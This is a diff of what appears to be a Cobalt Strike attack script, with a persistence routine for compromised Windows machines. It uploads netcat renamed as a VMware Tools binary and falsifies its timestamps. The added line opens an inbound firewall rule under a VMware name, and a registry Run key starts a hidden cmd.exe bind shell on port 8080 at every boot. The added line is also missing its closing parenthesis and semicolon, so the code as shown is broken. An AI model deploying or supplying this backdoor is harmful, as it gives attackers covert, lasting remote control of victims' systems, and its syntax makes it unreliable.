@@ -90,6 +90,7 @@ sub persist_runkey_netcat {
         bcd($1, 'c:\\program files\\vmware\\vmware tools');
         bupload($1, script_resource("vmtools.exe"));         ### copy /usr/share/windows-binaries/nc.exe to script directory
         btimestomp($1, "vmtools.exe", "vmtoolsd.exe");
+        bshell($1, 'netsh advfirewall firewall add rule name="VMWare Tools" dir=in action=allow program="C:\Program Files\Vmware\VMware Tools\vmtools.exe" enable=yes'
         bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VMware Tools" /t REG_SZ /d "C:\Program Files\Vmware\VMware Tools\vmtools.exe -lp 8080 -e cmd.exe" /f');
     }
     else {
